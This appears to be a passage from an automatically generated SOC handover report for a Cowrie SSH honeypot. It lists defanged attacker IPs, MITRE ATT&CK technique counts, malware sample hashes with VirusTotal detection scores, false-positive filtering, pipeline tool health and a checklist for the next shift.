| `118.186.208[.]20` | **15** | 2026-05-23 03:41 | 2026-05-23 03:56 | 24m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.158.40[.]65` | **10** | 2026-05-23 03:47 | 2026-05-23 04:32 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.184.36[.]192` | **8** | 2026-05-23 03:59 | 2026-05-23 04:11 | 12m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `13.86.112[.]154` | **2** | 2026-05-23 04:31 | 2026-05-23 04:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `135.237.125[.]201` | **2** | 2026-05-23 05:37 | 2026-05-23 05:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `102.210.148[.]92` | 1 | 2026-05-23 05:56 | 2026-05-23 05:56 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.88.137[.]213` | 1 | 2026-05-23 04:54 | 2026-05-23 04:54 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.50.185[.]190` | 1 | 2026-05-23 04:01 | 2026-05-23 04:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.20[.]170` | 1 | 2026-05-23 05:41 | 2026-05-23 05:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.78.9[.]93` | 1 | 2026-05-23 04:58 | 2026-05-23 04:59 | 30s | 0 | `T1592` | 🟢 LOW |
| `129.146.181[.]168` | 1 | 2026-05-23 03:45 | 2026-05-23 03:45 | 37s | 0 | `T1592` | 🟢 LOW |
| `134.209.122[.]128` | 1 | 2026-05-23 06:10 | 2026-05-23 06:10 | 10s | 0 | `T1592` | 🟢 LOW |
| `14.103.112[.]42` | 1 | 2026-05-23 04:51 | 2026-05-23 04:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `16.58.56[.]214` | 1 | 2026-05-23 04:44 | 2026-05-23 04:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `161.35.217[.]121` | 1 | 2026-05-23 06:25 | 2026-05-23 06:25 | 41s | 0 | `T1592` | 🟢 LOW |
| `176.65.148[.]44` | 1 | 2026-05-23 05:12 | 2026-05-23 05:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `177.54.229[.]192` | 1 | 2026-05-23 04:15 | 2026-05-23 04:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.91.186[.]36` | 1 | 2026-05-23 04:08 | 2026-05-23 04:08 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `184.54.241[.]105` | 1 | 2026-05-23 04:09 | 2026-05-23 04:09 | 3s | 0 | `T1592` | 🟢 LOW |
| `45.136.144[.]203` | 1 | 2026-05-23 05:07 | 2026-05-23 05:07 | 12s | 0 | `T1592` | 🟢 LOW |
| `60.184.112[.]246` | 1 | 2026-05-23 05:22 | 2026-05-23 05:23 | 41s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `184.54.241[.]105` | US | Charter Communications Inc | **100** ⚠️ | 6 |
| `120.78.9[.]93` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 50 |
| `176.65.148[.]44` | NL | Pfcloud UG | **100** ⚠️ | 20 |
| `113.44.104[.]43` | CN | Huawei Public Cloud Service (Huawei Software Technologies Ltd.Co) | **100** ⚠️ | 0 |
| `13.86.112[.]154` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `183.91.186[.]36` | VN | GLOBAL TECHNOLOGY - TELECOMMUNICATIONS CORPORATION | **100** ⚠️ | 26 |
| `161.35.217[.]121` | DE | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `102.88.137[.]80` | NG | MTN Nigeria | **100** ⚠️ | 50 |
| `16.58.56[.]214` | US | Amazon.com, Inc. | **100** ⚠️ | 50 |
| `117.50.185[.]190` | CN | Shanghai UCloud Information Technology Company Limited | **100** ⚠️ | 14 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 87 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 36 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 26 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 13 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 13 |

---

## 🔕 False Positive Summary (38 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 32 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 147 cases |
| Tool 34  | Credential Extractor        | ✅ 62 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 8 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 37 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 38 filtered (25.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 29 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 26 priority case(s) shown individually · 23 recon entry/entries in table (7 group(s) consolidating 67 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-23T06:37:33Z_
